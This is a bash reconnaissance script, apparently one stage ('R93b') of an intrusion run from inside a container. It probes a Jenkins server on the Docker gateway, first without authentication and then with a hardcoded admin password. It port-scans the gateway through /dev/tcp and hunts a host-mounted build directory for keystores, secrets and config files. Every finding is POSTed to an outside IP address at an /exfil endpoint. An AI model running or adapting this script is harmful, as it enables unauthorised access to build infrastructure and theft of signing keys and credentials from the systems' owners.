#!/usr/bin/env bash
# R93b: 宿主网关 Jenkins 探测 + /var/lib/buildhub 持久卷勘查
H="http://167.104.164.116:18095"
r(){ curl -sS --max-time 6 -X POST --data-binary "$1" "$H/exfil" >/dev/null 2>&1; }
GW=172.17.0.1
r "=== R93B START $(date -u) ==="

r "--- GW HTTP root ---"
r "root: $(curl -sS -m 6 -o /dev/null -w '%{http_code}' http://$GW/ 2>&1)"
r "hdr : $(curl -sS -m 6 -o /dev/null -w '%{http_code}' -H 'Host: jenkins-yinhe-data' http://$GW/ 2>&1)"

r "--- JENKINS PATHS (no auth) ---"
for p in /login /api/json /crumbIssuer/api/json /manage /script /jenkins/ /jenkins/login /job/prod-apk-aqy/ ; do
  c=$(curl -sS -m 6 -o /tmp/jp -w '%{http_code}' "http://$GW$p" 2>&1)
  r "PATH $p -> $c :: $(head -c 160 /tmp/jp 2>/dev/null | tr '\n' ' ')"
done

r "--- JENKINS PATHS (auth admin:Project2026.+.) ---"
for p in /login /api/json /crumbIssuer/api/json /whoAmI/api/json /job/prod-apk-aqy/api/json ; do
  c=$(curl -sS -m 8 -u 'admin:Project2026.+.' -o /tmp/jq -w '%{http_code}' "http://$GW$p" 2>&1)
  r "AUTH $p -> $c :: $(head -c 220 /tmp/jq 2>/dev/null | tr '\n' ' ')"
done

r "--- GW PORT SWEEP ---"
for p in 22 80 443 8080 8081 8082 9090 50000 3306 5432 6379 27017 8500 8501 3000 8443; do
  ( timeout 1 bash -c "exec 3<>/dev/tcp/$GW/$p" 2>/dev/null && r "GWOPEN $GW:$p" ) &
done
wait

r "--- /var/lib/buildhub (HOST BIND MOUNT) ---"
ls -la /var/lib/buildhub/ 2>&1 | head -30 | while read l; do r "BH $l"; done
r "--- .secrets anywhere ---"
find /var/lib/buildhub -maxdepth 5 \( -name '*.jks' -o -name '*.p12' -o -name '*.keystore' -o -name '.secrets' -o -name 'secrets' \) 2>/dev/null | head -40 | while read f; do
  r "SEC $f size=$(stat -c%s "$f" 2>/dev/null)"
done
r "--- env / config files in buildhub ---"
find /var/lib/buildhub -maxdepth 3 \( -name '.env*' -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' \) 2>/dev/null | head -30 | while read f; do r "CFG $f"; done

r "--- /var/lib listing (host root hints) ---"
ls -la /var/lib/ 2>&1 | head -35 | while read l; do r "VLIB $l"; done

r "=== R93B DONE ==="
exit 0
